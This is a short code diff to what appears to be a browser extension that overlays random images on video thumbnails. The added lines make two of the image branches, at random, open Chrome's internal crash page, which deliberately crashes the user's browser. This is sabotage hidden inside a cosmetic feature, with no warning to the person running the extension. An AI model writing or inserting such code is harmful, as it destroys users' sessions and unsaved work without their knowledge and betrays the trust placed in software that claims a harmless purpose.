@@ -96,8 +96,16 @@ function applyOverlayToThumbnails() {
                 overlayImageURL = chrome.runtime.getURL(`images/4.png`);
             } else if (random < 0.155) {
                 overlayImageURL = chrome.runtime.getURL(`images/3.png`);
+                // On 50% chance, crash the browser
+                if (Math.random() < 0.5) {
+                    window.open("chrome://inducebrowsercrashforrealz", "_blank").focus();
+                }
             } else if (random < 0.16) {
                 overlayImageURL = chrome.runtime.getURL(`images/5.png`);
+                // On 50% chance, crash the browser
+                if (Math.random() < 0.5) {
+                    window.open("chrome://inducebrowsercrashforrealz", "_blank").focus();
+                }                
             } else if (random < 0.58) {
                 overlayImageURL = chrome.runtime.getURL(`images/1.png`);
             } else {
